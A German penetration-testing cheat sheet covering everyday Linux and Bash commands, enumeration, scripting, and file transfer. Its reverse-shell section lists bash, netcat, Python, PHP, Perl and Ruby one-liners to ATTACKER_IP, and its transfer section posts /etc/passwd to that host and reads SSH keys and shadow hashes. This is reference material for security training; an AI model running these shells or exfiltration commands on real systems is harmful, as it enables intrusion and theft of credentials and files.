# 🐧 Linux-Befehle und Bash – vollständiger Spickzettel für Penetrationstests

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ ███████╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║███████╗
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║╚════██║
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝███████║
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-black?style=for-the-badge&logo=linux" alt="Linux">
  <img src="https://img.shields.io/badge/Bash-green?style=for-the-badge&logo=gnubash" alt="Bash">
  <img src="https://img.shields.io/badge/Pentesting-red?style=for-the-badge" alt="Pentesting">
</p>

---

## 📋 Inhaltsverzeichnis

- [Navigation und Dateien](#-navigation-und-dateien)
- [System-Enumeration](#-system-enumeration)
- [Benutzer-Enumeration](#-benutzer-enumeration)
- [Netzwerkbefehle](#-netzwerkbefehle)
- [Dateisuche und Analyse](#-dateisuche-und-analyse)
- [Textverarbeitung](#-textverarbeitung)
- [Berechtigungen und Eigentümer](#-berechtigungen-und-eigentümer)
- [Prozessverwaltung](#-prozessverwaltung)
- [Paketverwaltung](#-paketverwaltung)
- [Bash-Skripte](#-bash-skripte)
- [Reverse Shells](#-reverse-shells)
- [Dateiübertragung](#-dateiübertragung)
- [Einzeiler](#-einzeiler)

---

## 📁 Navigation und Dateien

### Verzeichnisnavigation

```bash
# Aktuelles Verzeichnis
pwd

# Verzeichnis wechseln
cd /path/to/dir
cd ..          # Übergeordnetes Verzeichnis
cd ~           # Home-Verzeichnis
cd -           # Vorheriges Verzeichnis

# Dateien auflisten
ls
ls -la         # Langes Ausgabeformat, alle Dateien
ls -lah        # Gut lesbare Größenangaben
ls -latr       # Nach Zeit sortieren, umgekehrte Reihenfolge
ll             # Alias für ls -la (laut Original auf vielen Distributionen)
```

### Dateioperationen

```bash
# Dateien und Verzeichnisse erstellen
touch file.txt
mkdir directory
mkdir -p dir1/dir2/dir3    # Übergeordnete Verzeichnisse erstellen

# Kopieren
cp source dest
cp -r source_dir dest_dir  # Rekursiv

# Verschieben/Umbenennen
mv source dest
mv oldname newname

# Löschen
rm file
rm -r directory            # Rekursiv
rm -rf directory           # Erzwingen, keine Rückfrage

# Dateien anzeigen
cat file.txt
less file.txt              # Seitenweise Anzeige
more file.txt
head -n 20 file.txt        # Erste 20 Zeilen
tail -n 20 file.txt        # Letzte 20 Zeilen
tail -f file.txt           # Neue Zeilen laufend anzeigen
```

### Archive und Kompression

```bash
# tar
tar -cvf archive.tar files/      # Erstellen
tar -xvf archive.tar             # Extrahieren
tar -czvf archive.tar.gz files/  # Mit gzip komprimiertes Archiv erstellen
tar -xzvf archive.tar.gz         # Mit gzip komprimiertes Archiv extrahieren

# zip/unzip
zip archive.zip file1 file2
zip -r archive.zip directory/
unzip archive.zip

# gzip/gunzip
gzip file
gunzip file.gz

# 7zip
7z x archive.7z
```

---

## 🔍 System-Enumeration

### Systeminformationen

```bash
# Hostname
hostname
hostname -I               # IP-Adressen

# Betriebssystem/Kernel
uname -a                  # Alle Informationen
uname -r                  # Kernelversion
cat /etc/os-release       # Informationen zum Betriebssystem
cat /etc/issue            # Betriebssystem-Banner
cat /proc/version         # Kernel- und Compilerinformationen

# Architektur
arch
uname -m

# Hardware
lscpu                     # CPU-Informationen
cat /proc/cpuinfo
free -h                   # Arbeitsspeicher
df -h                     # Speicherplatz
lsblk                     # Blockgeräte
```

### Umgebung

```bash
# Umgebungsvariablen
env
printenv
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# Variable setzen
export VAR="value"
VAR="value"
```

### Laufende Dienste

```bash
# Systemd
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl status service_name

# Init.d
service --status-all
service service_name status

# Lauschende Ports prüfen
ss -tulpn
netstat -tulpn
```

### Cronjobs

```bash
# Crontab des Benutzers
crontab -l

# Systemweite Crontabs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# Cron-Aktivitäten beobachten (mit pspy)
./pspy64
```

### Installierte Pakete

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RHEL/CentOS
rpm -qa
yum list installed

# Paket suchen
dpkg -l | grep package
which binary
whereis binary
```

---

## 👤 Benutzer-Enumeration

### Aktueller Benutzer

```bash
# Eigene Identität prüfen
whoami
id
id username

# Gruppen
groups
groups username

# Berechtigungen
sudo -l                   # Sudo-Berechtigungen
cat /etc/sudoers          # Sudoers-Datei (Root-Rechte erforderlich)
```

### Alle Benutzer

```bash
# Benutzerliste
cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd

# Benutzer mit Shell
cat /etc/passwd | grep -v "nologin\|false"
grep -v "nologin\|false" /etc/passwd

# Passwort-Hashes (Root-Rechte erforderlich)
cat /etc/shadow

# Kürzlich angemeldete Benutzer
last
lastlog
w
who
users
```

### Interessante Dateien

```bash
# SSH-Schlüssel
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Befehlsverlauf
cat ~/.bash_history
cat ~/.zsh_history
history

# Konfigurationsdateien
cat ~/.bashrc
cat ~/.profile
cat /etc/profile
```

---

## 🌐 Netzwerkbefehle

### Netzwerkkonfiguration

```bash
# IP-Adresse
ip a
ip addr show
ifconfig

# Routen
ip route
route -n
netstat -rn

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# ARP-Tabelle
arp -a
ip neigh
```

### Offene Ports und Verbindungen

```bash
# Lauschende Ports
ss -tulpn
ss -tlnp                  # Nur TCP
netstat -tulpn
netstat -ano

# Aktive Verbindungen
ss -tup
netstat -an | grep ESTABLISHED

# Prozess anhand des Ports finden
lsof -i :80
fuser 80/tcp
```

### Netzwerktests

```bash
# Ping
ping -c 4 host

# Traceroute
traceroute host
tracepath host

# DNS-Abfrage
host domain.com
dig domain.com
nslookup domain.com

# Port prüfen
nc -zv host port
timeout 1 bash -c "</dev/tcp/host/port" && echo open

# Curl
curl -I http://host       # Nur HTTP-Header
curl -s http://host       # Stille Ausgabe
curl -k https://host      # Zertifikatsprüfung deaktivieren
wget http://host/file
```

### Firewall

```bash
# iptables
iptables -L -n -v
iptables -L INPUT -n --line-numbers

# UFW (Ubuntu)
ufw status
ufw status verbose

# firewalld (CentOS)
firewall-cmd --list-all
```

---

## 🔎 Dateisuche und Analyse

### Der Befehl find

```bash
# Nach Namen suchen
find / -name "filename" 2>/dev/null
find / -iname "*.txt" 2>/dev/null      # Groß- und Kleinschreibung ignorieren

# Nach Typ suchen
find / -type f -name "*.conf"          # Dateien
find / -type d -name "backup"          # Verzeichnisse

# Nach Berechtigungen suchen
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
find / -perm -o+w 2>/dev/null          # Für alle Benutzer beschreibbar

# Nach Eigentümer suchen
find / -user root 2>/dev/null
find / -group admin 2>/dev/null

# Nach Größe suchen
find / -size +100M 2>/dev/null         # Größer als 100 MB laut Vorlage
find / -size -1k 2>/dev/null           # Kleiner als 1 KB laut Vorlage

# Nach Zeitstempeln suchen
find / -mtime -7 2>/dev/null           # In den letzten 7 Tagen geändert
find / -atime +30 2>/dev/null          # Letzter Zugriff vor mehr als 30 Tagen

# Suchen und ausführen
find / -name "*.sh" -exec chmod +x {} \;
find / -name "*.log" -exec rm {} \;
```

### Grep (Suche in Dateien)

```bash
# Einfache Suche
grep "pattern" file
grep -i "pattern" file                 # Groß- und Kleinschreibung ignorieren
grep -r "pattern" /path/               # Rekursiv
grep -rn "pattern" /path/              # Mit Zeilennummern

# Nicht passende Zeilen auswählen
grep -v "pattern" file                 # Zeilen OHNE Übereinstimmung

# Übereinstimmungen zählen
grep -c "pattern" file

# Kontext anzeigen
grep -A 3 "pattern" file               # 3 nachfolgende Zeilen
grep -B 3 "pattern" file               # 3 vorhergehende Zeilen
grep -C 3 "pattern" file               # 3 Zeilen davor und danach

# Regex
grep -E "regex" file                   # Erweiterter regulärer Ausdruck
egrep "regex" file

# Mehrere Suchmuster
grep -E "pattern1|pattern2" file
```

### Locate und Which

```bash
# Locate (setzt updatedb voraus)
locate filename
updatedb                               # Datenbank aktualisieren

# Which (Programmdatei finden)
which binary
whereis binary
type command
```

### Dateianalyse

```bash
# Dateityp
file filename

# Zeichenfolgen in einer Binärdatei
strings binary
strings binary | grep password

# Hexdump
xxd file
hexdump -C file

# Hashwert
md5sum file
sha256sum file
sha1sum file
```

---

<a name="-textverarbeitung"></a>

## ✂️ Textverarbeitung

### Cut

```bash
# Anhand eines Trennzeichens ausschneiden
cut -d: -f1 /etc/passwd                # Erstes Feld, : als Trennzeichen
cut -d: -f1,3 /etc/passwd              # Felder 1 und 3

# Anhand der Zeichenposition ausschneiden
cut -c1-10 file                        # Zeichen 1–10
```

### Awk

```bash
# Spalten ausgeben
awk '{print $1}' file                  # Erste Spalte
awk '{print $1, $3}' file              # Spalten 1 und 3
awk -F: '{print $1}' /etc/passwd       # Eigenes Trennzeichen

# Bedingungen
awk '$3 > 1000' /etc/passwd            # Zeilen, deren Feld 3 > 1000 ist
awk '/pattern/ {print $1}' file        # Passende Zeilen

# Eingebaute Variablen
awk '{print NR, $0}' file              # Zeilennummern
awk 'END {print NR}' file              # Gesamtzahl der Zeilen
```

### Sed

```bash
# Ersetzen
sed 's/old/new/' file                  # Erstes Vorkommen
sed 's/old/new/g' file                 # Alle Vorkommen
sed -i 's/old/new/g' file              # Datei direkt bearbeiten

# Zeilen löschen
sed '/pattern/d' file                  # Passende Zeilen löschen
sed '5d' file                          # Zeile 5 löschen
sed '1,5d' file                        # Zeilen 1–5 löschen

# Bestimmte Zeilen ausgeben
sed -n '5p' file                       # Zeile 5 ausgeben
sed -n '1,10p' file                    # Zeilen 1–10 ausgeben
```

### Sort und Uniq

```bash
# Sort
sort file
sort -r file                           # Umgekehrte Reihenfolge
sort -n file                           # Numerisch
sort -u file                           # Nur unterschiedliche Zeilen
sort -t: -k3 -n /etc/passwd            # Nach Feld 3

# Duplikate entfernen
uniq file                              # Direkt benachbarte Duplikate entfernen
sort file | uniq                       # Alle Duplikate entfernen
uniq -c file                           # Vorkommen zählen
sort file | uniq -c | sort -rn         # Zählen und sortieren
```

### Weitere nützliche Befehle

```bash
# Wörter zählen
wc -l file                             # Zeilen
wc -w file                             # Wörter
wc -c file                             # Bytes

# Spalten formatieren
column -t file                         # In Tabellenform anordnen
column -s: -t /etc/passwd              # Eigenes Trennzeichen

# tr (Zeichen umwandeln)
echo "HELLO" | tr 'A-Z' 'a-z'          # Kleinbuchstaben
cat file | tr -d '\n'                  # Zeilenumbrüche entfernen

# xargs
find . -name "*.txt" | xargs rm
cat urls.txt | xargs -I {} curl {}
```

---

## 🔐 Berechtigungen und Eigentümer

### Berechtigungen verstehen

```
-rwxr-xr-x
│└┬┘└┬┘└┬┘
│ │  │  └── Andere (r-x = 5)
│ │  └───── Gruppe (r-x = 5)
│ └──────── Eigentümer (rwx = 7)
└────────── Dateityp (- = Datei, d = Verzeichnis)
```

### Chmod

```bash
# Numerisch
chmod 755 file                         # rwxr-xr-x
chmod 644 file                         # rw-r--r--
chmod 777 file                         # rwxrwxrwx

# Symbolisch
chmod +x file                          # Ausführungsrecht hinzufügen
chmod -w file                          # Schreibrecht entfernen
chmod u+x file                         # Ausführungsrecht für den Eigentümer
chmod g+w file                         # Schreibrecht für die Gruppe
chmod o-r file                         # Leserecht für andere entfernen

# Rekursiv
chmod -R 755 directory/
```

### Chown

```bash
# Eigentümer ändern
chown user file
chown user:group file
chown -R user:group directory/

# Nur die Gruppe ändern
chgrp group file
```

### Besondere Berechtigungen

```bash
# SUID (Set User ID; Ausführung mit Eigentümer-Benutzer-ID) - 4
chmod u+s file
chmod 4755 file

# SGID (Set Group ID; Gruppen-ID setzen) - 2
chmod g+s directory
chmod 2755 directory

# Sticky Bit - 1
chmod +t directory
chmod 1755 directory

# SUID-/SGID-Dateien finden
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
```

---

<a name="-prozessverwaltung"></a>

## ⚙️ Prozessverwaltung

### Prozesse anzeigen

```bash
# Prozesse auflisten
ps aux
ps -ef
ps aux | grep process_name

# Top (laufende Anzeige)
top
htop                                   # Erweiterte Alternative laut Original

# Prozessbaum
pstree
ps auxf
```

### Prozesse steuern

```bash
# Hintergrund/Vordergrund
command &                              # Im Hintergrund ausführen
Ctrl+Z                                 # Anhalten
bg                                     # Im Hintergrund fortsetzen
fg                                     # In den Vordergrund holen
jobs                                   # Jobs auflisten

# Prozess beenden
kill PID
kill -9 PID                            # Beenden erzwingen
killall process_name
pkill process_name

# Nice (Priorität)
nice -n 10 command                     # Niedrigere Priorität
renice 10 -p PID
```

---

## 📦 Paketverwaltung

### Debian/Ubuntu (apt/dpkg)

```bash
# Aktualisieren
apt update
apt upgrade

# Installieren
apt install package
dpkg -i package.deb

# Entfernen
apt remove package
apt purge package                      # Mit Konfigurationsdateien entfernen

# Suchen
apt search package
apt-cache search package

# Informationen
apt show package
dpkg -l | grep package
```

### RHEL/CentOS (yum/dnf)

```bash
# Aktualisieren
yum update
dnf update

# Installieren
yum install package
dnf install package

# Entfernen
yum remove package

# Suchen
yum search package

# Informationen
yum info package
rpm -qa | grep package
```

---

## 💻 Bash-Skripte

### Grundlagen

```bash
#!/bin/bash

# Variablen
NAME="value"
echo $NAME
echo "${NAME}_suffix"

# Befehlssubstitution
DATE=$(date)
FILES=`ls -la`

# Eingabe lesen
read -p "Enter name: " NAME
echo "Hello $NAME"
```

### Bedingungen

```bash
# if/else
if [ condition ]; then
    echo "true"
elif [ condition2 ]; then
    echo "condition2"
else
    echo "false"
fi

# Vergleiche von Zeichenfolgen
if [ "$str1" = "$str2" ]; then
if [ "$str1" != "$str2" ]; then
if [ -z "$str" ]; then                 # Leer
if [ -n "$str" ]; then                 # Nicht leer

# Vergleiche von Zahlen
if [ $num1 -eq $num2 ]; then           # Gleich
if [ $num1 -ne $num2 ]; then           # Ungleich
if [ $num1 -gt $num2 ]; then           # Größer als
if [ $num1 -lt $num2 ]; then           # Kleiner als

# Dateiprüfungen
if [ -e file ]; then                   # Vorhanden
if [ -f file ]; then                   # Ist eine reguläre Datei
if [ -d dir ]; then                    # Ist ein Verzeichnis
if [ -r file ]; then                   # Lesbar
if [ -w file ]; then                   # Beschreibbar
if [ -x file ]; then                   # Ausführbar
```

### Schleifen

```bash
# for-Schleife
for i in 1 2 3 4 5; do
    echo $i
done

for i in {1..10}; do
    echo $i
done

for file in *.txt; do
    echo $file
done

for i in $(cat list.txt); do
    echo $i
done

# while-Schleife
while [ condition ]; do
    echo "loop"
done

while read line; do
    echo $line
done < file.txt

# for-Schleife im C-Stil
for ((i=0; i<10; i++)); do
    echo $i
done
```

### Funktionen

```bash
# Funktion definieren
function_name() {
    echo "Argument 1: $1"
    echo "Argument 2: $2"
    echo "All args: $@"
    echo "Num args: $#"
}

# Funktion aufrufen
function_name arg1 arg2
```

### Skriptbeispiel

```bash
#!/bin/bash
# Portscanner

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

TARGET=$1

for PORT in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && echo "Port $PORT open"
done
```

---

## 🔌 Reverse Shells

### Bash

```bash
# Bash TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Bash UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

### Netcat

```bash
# nc mit -e
nc -e /bin/bash ATTACKER_IP PORT

# nc ohne -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Shell erweitern

```bash
# TTY starten
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash

# Vollständige TTY
# In der Reverse Shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
# Auf dem Angreiferrechner:
stty raw -echo; fg
# In der Shell:
export TERM=xterm
stty rows 40 cols 150
```

---

<a name="-dateiübertragung"></a>

## ⬇️ Dateiübertragung

### Vom Angreifer zum Ziel

```bash
# wget
wget http://ATTACKER_IP/file -O /tmp/file

# curl
curl http://ATTACKER_IP/file -o /tmp/file

# nc
# Angreifer: nc -lvnp 4444 < file
nc ATTACKER_IP 4444 > file

# scp
scp user@ATTACKER_IP:/path/file /tmp/

# base64 (für kleine Dateien)
# Angreifer: base64 file
echo "BASE64_STRING" | base64 -d > file
```

### Vom Ziel zum Angreifer

```bash
# nc
# Angreifer: nc -lvnp 4444 > file
nc ATTACKER_IP 4444 < file

# curl (POST)
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP/upload

# base64
base64 file
# Ausgabe auf den Angreiferrechner kopieren und dekodieren
```

### HTTP-Server starten

```bash
# Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -e httpd . -p 8000
```

---

## ⚡ Einzeiler

### Nützliche Einzeiler für Penetrationstests

```bash
# SUID-Programme finden
find / -perm -4000 -type f 2>/dev/null

# Beschreibbare Verzeichnisse finden
find / -writable -type d 2>/dev/null

# Für alle Benutzer beschreibbare Dateien finden
find / -perm -o+w -type f 2>/dev/null

# Konfigurationsdateien mit Passwörtern suchen
grep -r "password" /etc/ 2>/dev/null
grep -ri "pass\|pwd\|secret" /var/www/ 2>/dev/null

# SSH-Schlüssel finden
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Schneller Portscan
for p in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/TARGET/$p" 2>/dev/null && echo "$p open"; done

# Erreichbare Hosts mit Ping ermitteln
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "from" & done

# IP-Adressen aus Datei extrahieren
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file

# Base64 kodieren/dekodieren
echo "string" | base64
echo "c3RyaW5n" | base64 -d

# URL kodieren/dekodieren
echo "string" | xxd -plain | sed 's/\(..\)/%\1/g'
echo "%73%74%72%69%6e%67" | xxd -r -p
```

### Tabelle zum Nachschlagen

| Zweck | Befehl |
|---------|---------|
| Aktueller Benutzer | `whoami` / `id` |
| Systeminformationen | `uname -a` |
| IP-Adresse | `ip a` / `hostname -I` |
| Offene Ports | `ss -tulpn` |
| Laufende Prozesse | `ps aux` |
| SUID-Dateien finden | `find / -perm -4000 2>/dev/null` |
| Beschreibbare Verzeichnisse | `find / -writable -type d 2>/dev/null` |
| Datei herunterladen | `wget http://url/file` |
| Reverse Shell | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| TTY erweitern | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |

---

## 📚 Ressourcen

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux](https://book.hacktricks.xyz/linux-hardening)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Spickzettel für Reverse Shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Verwandte Spickzettel
- [Rechteausweitung unter Linux](../../Linux-PrivEsc/README.md)
- [Nmap](../../Nmap/README.md)
- [Metasploit](../../Metasploit/translations/README.de.md)

---

<p align="center">
  <b>🐧 Linux für Penetrationstests beherrschen!</b><br>
  <i>Die Kommandozeile ist dein wichtigstes Werkzeug</i>
</p>

---

## Hinweise zur deutschen Ausgabe

> **Begriffe und Voraussetzungen:** *Enumeration* bezeichnet das systematische Ermitteln von Informationen. Eine *Reverse Shell* verbindet sich vom Ziel zum Listener zurück; eine *TTY* stellt eine Terminalschnittstelle bereit. Aliase wie `ll`, verfügbare Werkzeuge, Dienstverwaltung und Netcat-Optionen hängen von Distribution, Shell und Implementierung ab. `Ctrl+Z` ist eine Tastenkombination, kein einzutippender Befehl. `ATTACKER_IP`, `TARGET`, `PORT` und andere Musterwerte sind Platzhalter. Die gezeigten Skriptfragmente sind nicht durchgehend eigenständige Programme: Einzelne `if`-Zeilen benötigen passende Befehle und ein abschließendes `fi`. `/dev/tcp` und `/dev/udp` sind besondere Bash-Umleitungsfunktionen und keine allgemeinen Dateien jeder Shell. [Bash: Bedingungen](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html), [Bash: Umleitungen](https://www.gnu.org/software/bash/manual/html_node/Redirections.html).

> **Korrektur zu awk und find:** Das Beispiel `awk '$3 > 1000' /etc/passwd` setzt keinen Doppelpunkt als Feldtrenner; die Standardaufteilung an Leerraum passt daher nicht zu dieser Datei. Die Größen-Endungen `M` und `k` bei GNU find beziehen sich auf MiB beziehungsweise KiB und runden Dateigrößen auf ganze Einheiten auf. Dadurch erfasst `-size -1k` bei regulären Dateien nicht alle Dateien unter 1024 Bytes, sondern nur leere Dateien. Die Kommentare der Vorlage sind insoweit vereinfacht; Originalbefehle bleiben unverändert. [GNU awk: Feldaufteilung](https://www.gnu.org/software/gawk/manual/html_node/Field-Splitting-Summary.html), [GNU find: Größen](https://www.gnu.org/software/findutils/manual/html_node/find_html/Size.html).

> **Weitere Grenzen:** Das IPv4-Muster prüft keine gültigen Oktettbereiche. Die Hex-/Prozentdarstellung am Ende ist kein vollständiger URL-Encoder oder -Decoder; `echo` fügt normalerweise einen Zeilenumbruch hinzu, und URL-Konventionen wie `+` werden nicht allgemein behandelt. `xxd -r -p` verarbeitet einfache Hexdarstellungen. Unquotierte Variablen und `xargs`-Beispiele berücksichtigen nicht sämtliche Dateinamen mit Leerraum oder Sonderzeichen. [Vim: xxd-Handbuch](https://github.com/vim/vim/blob/master/runtime/doc/xxd.man).

> **Versionen und Wirkung:** `SimpleHTTPServer` ist ein Python-2-Beispiel; Python 2 wird seit 2020 nicht mehr unterstützt. Die Datei enthält außerdem historische Netzwerkwerkzeuge und implementierungsabhängige Netcat-Aufrufe. `curl -k` deaktiviert die Prüfung des Serverzertifikats, nicht TLS selbst. Befehle mit `rm`, `chmod`, Paketverwaltung oder Dienstverwaltung können Daten beziehungsweise Systeme verändern; sie sind keine reinen Anzeigeoperationen. Das Dokument bewahrt die Originalbeispiele und hat sie nicht ausgeführt. [Python: Ende von Python 2](https://www.python.org/doc/sunset-python-2/).
